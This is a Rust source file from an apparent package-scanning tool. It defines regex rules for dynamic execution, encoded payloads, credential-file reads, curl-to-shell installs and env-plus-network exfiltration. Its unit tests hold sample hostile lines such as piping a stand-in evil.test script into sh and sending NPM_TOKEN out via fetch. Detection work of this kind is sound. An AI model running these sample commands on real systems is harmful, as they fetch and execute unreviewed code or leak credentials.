//! Static text rules for extracted source files.
//!
//! A single API match is suspicious, not proof. Rules start at WARN with medium
//! confidence; only a combination (network plus credential access, or an
//! encoded payload executed) reaches HIGH. Comments are ignored.

use std::sync::OnceLock;

use regex::Regex;
use serde::Serialize;

use crate::archive::ExtractedFile;
use crate::model::{Confidence, Severity};

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct RuleFinding {
    pub rule: &'static str,
    pub title: &'static str,
    pub description: &'static str,
    pub severity: Severity,
    pub confidence: Confidence,
    pub file: String,
    pub line: usize,
    pub evidence: String,
    pub recommendation: &'static str,
    pub references: Vec<&'static str>,
}

fn regex(pattern: &'static str) -> &'static Regex {
    static CACHE: OnceLock<
        std::sync::Mutex<std::collections::HashMap<&'static str, &'static Regex>>,
    > = OnceLock::new();
    let map = CACHE.get_or_init(|| std::sync::Mutex::new(std::collections::HashMap::new()));
    let mut map = map.lock().unwrap_or_else(|poison| poison.into_inner());
    map.entry(pattern)
        .or_insert_with(|| Box::leak(Box::new(Regex::new(pattern).expect("valid rule regex"))))
}

fn is_comment(line: &str) -> bool {
    let trimmed = line.trim_start();
    trimmed.starts_with("//")
        || trimmed.starts_with('#')
        || trimmed.starts_with('*')
        || trimmed.starts_with("/*")
        || trimmed.starts_with("--")
}

fn first_hit(text: &str, pattern: &'static str) -> Option<(usize, String)> {
    for (index, line) in text.lines().enumerate() {
        if is_comment(line) {
            continue;
        }
        if regex(pattern).is_match(line) {
            return Some((index + 1, line.trim().chars().take(160).collect()));
        }
    }
    None
}

fn any_hit(text: &str, pattern: &'static str) -> bool {
    text.lines()
        .filter(|line| !is_comment(line))
        .any(|line| regex(pattern).is_match(line))
}

struct Rule {
    id: &'static str,
    title: &'static str,
    description: &'static str,
    pattern: &'static str,
    severity: Severity,
    recommendation: &'static str,
    references: &'static [&'static str],
    extensions: &'static [&'static str],
}

const RULES: &[Rule] = &[
    Rule {
        id: "JS-EXEC-001",
        title: "dynamic code execution",
        description: "The file evaluates a string as code, which hides what runs until runtime.",
        pattern: r"\beval\s*\(|new\s+Function\s*\(",
        severity: Severity::Warn,
        recommendation: "Review why this package evaluates code at runtime.",
        references: &[
            "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval",
        ],
        extensions: &["js", "mjs", "cjs", "ts", "tsx", "jsx"],
    },
    Rule {
        id: "JS-CHILD-001",
        title: "spawns a child process",
        description: "The file can run an external command, a common path for install-time payloads.",
        pattern: r#"require\(['"]child_process['"]\)|from ['"]child_process['"]"#,
        severity: Severity::Warn,
        recommendation: "Check which command runs and whether install-time use is expected.",
        references: &["https://nodejs.org/api/child_process.html"],
        extensions: &["js", "mjs", "cjs", "ts", "tsx", "jsx"],
    },
    Rule {
        id: "JS-OBF-001",
        title: "decodes and executes an encoded payload",
        description: "Base64 data is decoded straight into eval, hiding the executed code.",
        pattern: r"eval\s*\(\s*(atob|Buffer\.from\s*\([^)]*base64)",
        severity: Severity::High,
        recommendation: "Do not install until the encoded payload is decoded and reviewed.",
        references: &["https://developer.mozilla.org/en-US/docs/Web/API/atob"],
        extensions: &["js", "mjs", "cjs", "ts", "tsx", "jsx"],
    },
    Rule {
        id: "JS-FS-001",
        title: "reads well-known credential paths",
        description: "The file references SSH, npm, AWS, or GPG credential locations.",
        pattern: r"\.ssh/|\.npmrc|\.aws/credentials|id_rsa|\.gnupg|\.docker/config",
        severity: Severity::Warn,
        recommendation: "Check whether the package has any reason to read these files.",
        references: &["https://owasp.org/www-community/attacks/Credential_stuffing"],
        extensions: &["js", "mjs", "cjs", "ts", "tsx", "jsx"],
    },
    Rule {
        id: "PY-EXEC-001",
        title: "dynamic code execution",
        description: "The file runs a string as code, hiding the behavior from a plain read.",
        pattern: r"\b(exec|eval)\s*\(",
        severity: Severity::Warn,
        recommendation: "Review the string being executed and where it comes from.",
        references: &["https://docs.python.org/3/library/functions.html#eval"],
        extensions: &["py"],
    },
    Rule {
        id: "PY-IMPORT-001",
        title: "imports a module by name at runtime",
        description: "Dynamic imports can load code that static review never sees.",
        pattern: r"__import__\s*\(|importlib\.import_module\s*\(",
        severity: Severity::Warn,
        recommendation: "Check where the imported name comes from before installing.",
        references: &["https://docs.python.org/3/library/importlib.html"],
        extensions: &["py"],
    },
    Rule {
        id: "PY-OBF-001",
        title: "executes base64-decoded code",
        description: "An encoded payload is decoded into exec, hiding what runs.",
        pattern: r"exec\s*\([^)]*(b64decode|base64|codecs\.decode)",
        severity: Severity::High,
        recommendation: "Decode the payload and review it before installing.",
        references: &["https://docs.python.org/3/library/base64.html"],
        extensions: &["py"],
    },
    Rule {
        id: "PY-SHELL-001",
        title: "runs a shell command",
        description: "shell=True lets a string be interpreted by the shell, including pipes.",
        pattern: r"subprocess\.[A-Za-z_]+\([^)]*shell\s*=\s*True",
        severity: Severity::Warn,
        recommendation: "Check whether shell=True is required and what input reaches it.",
        references: &["https://docs.python.org/3/library/subprocess.html#security-considerations"],
        extensions: &["py"],
    },
    Rule {
        id: "SH-PIPE-001",
        title: "downloads and executes a remote script",
        description: "A downloaded script is piped into a shell, so it runs unreviewed.",
        pattern: r"(curl|wget)[^\n|]*\|\s*(ba)?sh\b",
        severity: Severity::High,
        recommendation: "Do not install; fetch and review the script instead.",
        references: &["https://owasp.org/www-community/attacks/Command_Injection"],
        extensions: &["sh", "bash", "zsh"],
    },
    Rule {
        id: "RS-BUILD-001",
        title: "build script runs commands or opens a socket",
        description: "build.rs executes at compile time, before any test or review of the crate.",
        pattern: r"Command::new\(|std::net|TcpStream",
        severity: Severity::Warn,
        recommendation: "Review build.rs: compile steps are expected, network or shell calls are not.",
        references: &["https://doc.rust-lang.org/cargo/reference/build-scripts.html"],
        extensions: &["rs"],
    },
    Rule {
        id: "GO-EXEC-001",
        title: "runs an external command",
        description: "The file imports os/exec, which can run any binary on the machine.",
        pattern: r#""os/exec""#,
        severity: Severity::Warn,
        recommendation: "Check which binary is executed and why.",
        references: &["https://pkg.go.dev/os/exec"],
        extensions: &["go"],
    },
    Rule {
        id: "PHP-EXEC-001",
        title: "dynamic execution or shell call",
        description: "The file can run code or a shell command; both are install-time vectors.",
        pattern: r"\b(eval|system|shell_exec|passthru|assert)\s*\(",
        severity: Severity::Warn,
        recommendation: "Review the executed string and its source.",
        references: &["https://www.php.net/manual/en/function.eval.php"],
        extensions: &["php"],
    },
    Rule {
        id: "PHP-OBF-001",
        title: "executes base64-decoded code",
        description: "An encoded payload is decoded into eval, hiding what runs.",
        pattern: r"eval\s*\(\s*(base64_decode|gzinflate|str_rot13)",
        severity: Severity::High,
        recommendation: "Decode the payload and review it before installing.",
        references: &["https://www.php.net/manual/en/function.base64-decode.php"],
        extensions: &["php"],
    },
];

/// Ids accepted in `[inspect] disabled_rules`. Keep in step with `RULES` and
/// the combination rules emitted in `scan`.
pub const COMBO_RULES: &[&str] = &["JS-NET-001", "PY-NET-001", "GO-NET-001"];

pub fn is_known_rule(id: &str) -> bool {
    RULES.iter().any(|rule| rule.id == id) || COMBO_RULES.contains(&id)
}

pub fn scan(files: &[ExtractedFile]) -> Vec<RuleFinding> {
    scan_with(files, &[])
}

/// Extensions the rule engine reads. A skipped file with one of these means
/// unscanned code, not an uninteresting binary.
pub const SCANNABLE_EXTENSIONS: &[&str] = &[
    "js", "mjs", "cjs", "ts", "tsx", "jsx", "py", "sh", "bash", "zsh", "rb", "php", "go", "rs",
];

pub fn is_scannable(path: &str) -> bool {
    std::path::Path::new(path)
        .extension()
        .and_then(|value| value.to_str())
        .is_some_and(|extension| {
            SCANNABLE_EXTENSIONS.contains(&extension.to_ascii_lowercase().as_str())
        })
}

/// Disclose anything the caps kept from the scanner. Unknown entries beyond the
/// entry cap count as scannable because their names were never read.
pub fn partially_scanned(extracted: &crate::archive::Extracted, side: &str) -> Option<RuleFinding> {
    if !extracted.truncated {
        return None;
    }
    let scannable_skip = extracted
        .oversize_files
        .iter()
        .any(|path| is_scannable(path));
    let mut reasons = Vec::new();
    if !extracted.oversize_files.is_empty() {
        let mut shown = extracted
            .oversize_files
            .iter()
            .take(5)
            .cloned()
            .collect::<Vec<_>>()
            .join(", ");
        if extracted.oversize_files.len() > 5 {
            shown.push_str(&format!(" (+{} more)", extracted.oversize_files.len() - 5));
        }
        reasons.push(format!("size cap: {shown}"));
    }
    if extracted.entries_over_cap {
        reasons.push("entries past the archive entry cap were not read".to_string());
    }
    if extracted.total_over_cap {
        reasons.push("the total uncompressed budget ran out".to_string());
    }
    if reasons.is_empty() {
        return None;
    }
    let severity = if scannable_skip || extracted.entries_over_cap {
        Severity::Warn
    } else {
        Severity::Info
    };
    Some(RuleFinding {
        rule: "archive-partially-scanned",
        title: "not all of this archive was scanned",
        description: "Archive limits stopped the scanner before the end, so findings may be missing.",
        severity,
        confidence: Confidence::High,
        file: String::new(),
        line: 0,
        evidence: format!("{side}{}", reasons.join("; ")),
        recommendation: "Review the skipped files manually before installing.",
        references: vec!["https://github.com/nassih-yassine/Dep-Vet#inspect-a-release-archive"],
    })
}

pub fn scan_with(files: &[ExtractedFile], disabled: &[String]) -> Vec<RuleFinding> {
    let allowed = |id: &str| !disabled.iter().any(|rule| rule == id);
    let mut findings = Vec::new();
    for file in files {
        let extension = std::path::Path::new(&file.path)
            .extension()
            .and_then(|value| value.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase();
        for rule in RULES {
            if !allowed(rule.id) {
                continue;
            }
            if !rule.extensions.contains(&extension.as_str()) {
                continue;
            }
            if rule.id == "RS-BUILD-001" && !file.path.ends_with("build.rs") {
                continue;
            }
            let Some((line, evidence)) = first_hit(&file.text, rule.pattern) else {
                continue;
            };
            findings.push(RuleFinding {
                rule: rule.id,
                title: rule.title,
                description: rule.description,
                severity: rule.severity,
                confidence: Confidence::Medium,
                file: file.path.clone(),
                line,
                evidence,
                recommendation: rule.recommendation,
                references: rule.references.to_vec(),
            });
        }

        // Corroborated combinations are the only path to HIGH for network use.
        let js = matches!(
            extension.as_str(),
            "js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx"
        );
        if js
            && any_hit(
                &file.text,
                r#"require\(['"](https?|net)['"]\)|\bfetch\s*\("#,
            )
            && any_hit(&file.text, r"process\.env")
            && let Some((line, evidence)) = first_hit(&file.text, r"process\.env")
        {
            findings.push(RuleFinding {
                rule: "JS-NET-001",
                title: "reads credentials and talks to the network",
                description: "The same file reads environment variables and opens a connection.",
                severity: Severity::High,
                confidence: Confidence::Medium,
                file: file.path.clone(),
                line,
                evidence,
                recommendation: "Review where the environment data is sent before installing.",
                references: vec!["https://owasp.org/www-community/attacks/Command_Injection"],
            });
        }
        if allowed("PY-NET-001")
            && extension == "py"
            && any_hit(
                &file.text,
                r"\b(import|from)\s+requests\b|\brequests\.(get|post|put|delete|request)\s*\(|\bsocket\.socket\s*\(|urllib\.request\b|\bhttp\.client\b",
            )
            && any_hit(&file.text, r"os\.environ")
            && let Some((line, evidence)) = first_hit(&file.text, r"os\.environ")
        {
            findings.push(RuleFinding {
                rule: "PY-NET-001",
                title: "reads credentials and talks to the network",
                description: "The same file reads environment variables and opens a connection.",
                severity: Severity::High,
                confidence: Confidence::Medium,
                file: file.path.clone(),
                line,
                evidence,
                recommendation: "Review where the environment data is sent before installing.",
                references: vec!["https://owasp.org/www-community/attacks/Command_Injection"],
            });
        }

        if allowed("GO-NET-001")
            && extension == "go"
            && any_hit(&file.text, r#""net/http"|"net"\b"#)
            && any_hit(&file.text, r"os\.Getenv")
            && let Some((line, evidence)) = first_hit(&file.text, r"os\.Getenv")
        {
            findings.push(RuleFinding {
                rule: "GO-NET-001",
                title: "reads credentials and talks to the network",
                description: "The same file reads environment variables and opens a connection.",
                severity: Severity::High,
                confidence: Confidence::Medium,
                file: file.path.clone(),
                line,
                evidence,
                recommendation: "Review where the environment data is sent before installing.",
                references: vec!["https://owasp.org/www-community/attacks/Command_Injection"],
            });
        }
    }

    findings.sort_by(|left, right| {
        left.file
            .cmp(&right.file)
            .then(left.line.cmp(&right.line))
            .then(left.rule.cmp(right.rule))
    });
    findings.dedup_by(|left, right| {
        left.file == right.file && left.line == right.line && left.rule == right.rule
    });
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    fn file(path: &str, text: &str) -> ExtractedFile {
        ExtractedFile {
            path: path.to_string(),
            text: text.to_string(),
        }
    }

    #[test]
    fn javascript_execution_is_a_warning() {
        let findings = scan(&[file("lib/index.js", "eval(input)\n")]);
        assert_eq!(findings[0].rule, "JS-EXEC-001");
        assert_eq!(findings[0].severity, Severity::Warn);
        assert_eq!(findings[0].line, 1);
    }

    #[test]
    fn encoded_execution_is_high() {
        let findings = scan(&[file("lib/x.js", "eval(atob(payload))\n")]);
        let finding = findings
            .iter()
            .find(|finding| finding.rule == "JS-OBF-001")
            .expect("missing encoded-execution finding");
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn comments_do_not_fire() {
        let findings = scan(&[file("lib/x.js", "// eval(untrusted)\n")]);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn network_alone_is_not_enough_but_with_env_is_high() {
        let alone = scan(&[file("lib/x.js", "fetch('https://example.test')\n")]);
        assert!(alone.iter().all(|finding| finding.rule != "JS-NET-001"));

        let combined = scan(&[file(
            "lib/x.js",
            "const token = process.env.NPM_TOKEN;\nfetch('https://example.test', { token });\n",
        )]);
        let finding = combined
            .iter()
            .find(|finding| finding.rule == "JS-NET-001")
            .expect("missing combined finding");
        assert_eq!(finding.severity, Severity::High);
        assert_eq!(finding.line, 1);
    }

    #[test]
    fn shell_pipe_is_high_and_only_for_shell_files() {
        let script = "curl https://evil.test | sh\n";
        assert_eq!(
            scan(&[file("install.sh", script)])[0].severity,
            Severity::High
        );
        assert!(scan(&[file("install.js", script)]).is_empty());
    }

    #[test]
    fn python_rules_and_shell_false_positive() {
        let findings = scan(&[file(
            "setup.py",
            "import subprocess\nsubprocess.run(cmd, shell=True)\n",
        )]);
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule == "PY-SHELL-001")
        );

        let findings = scan(&[file("a.py", "value = evaluation_score\n")]);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn framework_code_is_not_flagged_as_credential_exfiltration() {
        // Flask reads FLASK_ENV and mentions requests in prose; neither is a
        // network call by itself.
        let findings = scan(&[file(
            "src/flask/helpers.py",
            "import os\nfrom urllib.parse import quote\nreturn quote(os.environ.get('FLASK_ENV'))\n",
        )]);
        assert!(
            findings.iter().all(|finding| finding.rule != "PY-NET-001"),
            "{findings:?}"
        );
    }

    #[test]
    fn a_redis_method_named_exec_is_not_a_shell_call() {
        let findings = scan(&[file("src/Handler.php", "$this->redis->exec();\n")]);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn credential_paths_and_dynamic_imports_are_flagged() {
        let js = scan(&[file("lib/x.js", "fs.readFileSync(home + '/.ssh/id_rsa')\n")]);
        assert!(js.iter().any(|finding| finding.rule == "JS-FS-001"));

        let py = scan(&[file("a.py", "module = importlib.import_module(name)\n")]);
        assert!(py.iter().any(|finding| finding.rule == "PY-IMPORT-001"));

        let encoded = scan(&[file("a.py", "exec(base64.b64decode(payload))\n")]);
        let finding = encoded
            .iter()
            .find(|finding| finding.rule == "PY-OBF-001")
            .expect("missing encoded python payload");
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn go_network_plus_env_is_high() {
        let findings = scan(&[file(
            "cmd/main.go",
            "import \"net/http\"\ntoken := os.Getenv(\"TOKEN\")\nhttp.Get(url)\n",
        )]);
        let finding = findings
            .iter()
            .find(|finding| finding.rule == "GO-NET-001")
            .expect("missing go network finding");
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn php_encoded_payload_is_high() {
        let findings = scan(&[file("a.php", "eval(base64_decode($payload));\n")]);
        let finding = findings
            .iter()
            .find(|finding| finding.rule == "PHP-OBF-001")
            .expect("missing php encoded payload");
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn rule_ids_are_discoverable_and_disableable() {
        for rule in RULES {
            assert!(is_known_rule(rule.id), "{}", rule.id);
        }
        for rule in COMBO_RULES {
            assert!(is_known_rule(rule));
        }
        assert!(!is_known_rule("NOPE-000"));
        let findings = scan_with(
            &[file("lib/x.js", "eval(atob(payload))\n")],
            &["JS-OBF-001".to_string()],
        );
        assert!(findings.iter().all(|finding| finding.rule != "JS-OBF-001"));
        assert!(findings.iter().any(|finding| finding.rule == "JS-EXEC-001"));
    }

    #[test]
    fn every_finding_has_description_and_references() {
        let findings = scan(&[file("lib/x.js", "eval(atob(payload))\n")]);
        for finding in findings {
            assert!(!finding.description.is_empty(), "{finding:?}");
            assert!(!finding.references.is_empty(), "{finding:?}");
        }
    }

    #[test]
    fn rust_build_rule_only_applies_to_build_rs() {
        assert!(scan(&[file("src/lib.rs", "Command::new(\"cc\");\n")]).is_empty());
        assert_eq!(
            scan(&[file("build.rs", "Command::new(\"cc\");\n")])[0].rule,
            "RS-BUILD-001"
        );
    }

    #[test]
    fn findings_are_sorted_and_deduplicated() {
        let findings = scan(&[file("x.js", "eval(a)\nfetch(u, { t: process.env.T })\n")]);
        let ordered: Vec<_> = findings
            .iter()
            .map(|finding| (finding.file.as_str(), finding.line, finding.rule))
            .collect();
        let mut sorted = ordered.clone();
        sorted.sort();
        assert_eq!(ordered, sorted);
    }
}
